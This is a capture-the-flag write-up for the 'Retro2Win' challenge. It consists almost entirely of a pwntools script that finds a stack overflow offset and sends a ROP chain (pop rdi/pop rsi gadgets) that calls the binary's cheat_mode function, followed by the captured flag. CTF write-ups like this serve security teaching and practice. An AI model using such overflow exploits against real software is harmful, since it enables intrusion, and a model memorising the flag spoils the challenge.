# Retro2Win

Solved by: @w6rstpain

## Question:
So retro.. So winning..


## Solution:
```
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level='warn')
    p.recvuntil(b'Select an option:')
    p.sendline('1337')
    p.recvuntil(b'Enter your cheatcode:')
    p.sendline(payload)
    p.wait()
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break *0x000000000040073e
continue
'''.format(**locals())

# Binary filename
exe = './retro2win'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


offset = find_ip(cyclic(500))

# Start program
p = start()


#cheat_mode = 0x401196
param_1 = 0x2323232323232323
param_2 = 0x4242424242424242
pop_rdi = 0x4009b3
pop_rsi = 0x4009b1

payload = flat(
    b'A' * offset,
    p64(pop_rdi),
    p64(param_1),
    p64(pop_rsi),
    p64(param_2),
    0x0,
    elf.symbols['cheat_mode']
    
    
)


p.recvuntil(b'Select an option:')
p.sendline('1337')
p.recvuntil(b'Enter your cheatcode:')
p.sendline(payload)

output = p.recvall()  
print(output)
p.interactive()



```

**Flag:** `INTIGRITI{3v3ry_c7f_n33d5_50m3_50r7_0f_r372w1n}`
